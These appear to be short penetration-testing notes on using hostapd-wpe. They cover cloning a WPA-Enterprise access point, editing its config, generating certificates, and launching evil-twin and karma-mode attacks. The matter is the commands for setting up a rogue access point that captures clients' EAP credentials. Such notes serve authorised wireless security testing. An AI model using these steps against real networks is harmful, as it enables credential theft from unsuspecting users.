### Source
https://github.com/OpenSecurityResearch/hostapd-wpe  

### General information to clone access point
```
get vendor of to clone access point
dont use the same bssid and channel -> otherwise you create conflicts and probably DOS
```

### Copy example config
```
/etc/hostapd-wpe/hostapd-wpe.conf
```

### Edit copied config
```
interface=<interface>
...
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=<password>
dh_file=/etc/hostapd-wpe/certs/dh
ssid=hostapd-wpe                                                                                   
channel=1
...
bssid=<bssid>
```

### Launch evil twin attack (in config at least interface, ssid and channel must be set)
```
hostapd-wpe -c hostapd-wpe.conf
```

### Create custom certificates using example certs
```
/etc/hostapd-wpe/certs
```

### Delete all certificates
```
make destroycerts
```

### Create new dh-param
```
./bootstrap
```

### Edit certs
```
vim ca.cnf
```

### Create new certificates 
```
make ca
make client
make server
```

### Karma mode
```
hostapd-wpe -k <config>
```

